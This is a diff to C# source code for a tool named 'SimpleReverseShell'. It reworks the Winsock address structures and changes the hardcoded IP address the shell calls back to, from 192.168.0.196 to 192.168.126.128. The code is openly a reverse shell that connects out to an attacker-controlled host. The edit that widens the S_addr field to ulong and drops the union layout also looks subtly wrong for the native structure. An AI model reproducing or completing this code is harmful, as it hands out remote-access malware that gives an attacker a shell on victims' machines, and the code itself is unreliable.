@@ -187,18 +187,11 @@ namespace SimpleReverseShell
     [StructLayout(LayoutKind.Sequential)]
     internal struct In_Addr
     {
-      internal S_Un S_un;
-    }
-
-    [StructLayoutAttribute(LayoutKind.Sequential)]
-    public struct S_Un
-    {
-
       public S_un_b S_un_b;
 
       public S_un_w S_un_w;
 
-      public uint S_addr;
+      public ulong S_addr;
     }
 
     [StructLayoutAttribute(LayoutKind.Sequential)]
@@ -267,7 +260,7 @@ namespace SimpleReverseShell
       var protcolInfo = new WSAPROTOCOL_INFOA();
 
       var addrIn = new In_Addr();
-      addrIn.S_un.S_addr = ConvertFromIPAddress(IPAddress.Parse("192.168.0.196"));
+      addrIn.S_addr = ConvertFromIPAddress(IPAddress.Parse("192.168.126.128"));
 
       var sockAddrIn = new SockAddr_In();
       sockAddrIn.s_family = 2;
@@ -299,7 +292,7 @@ namespace SimpleReverseShell
       }
     }
 
-    private uint ConvertFromIPAddress(IPAddress ipAddress)
+    private ulong ConvertFromIPAddress(IPAddress ipAddress)
     {
       var bytes = ipAddress.GetAddressBytes();
 
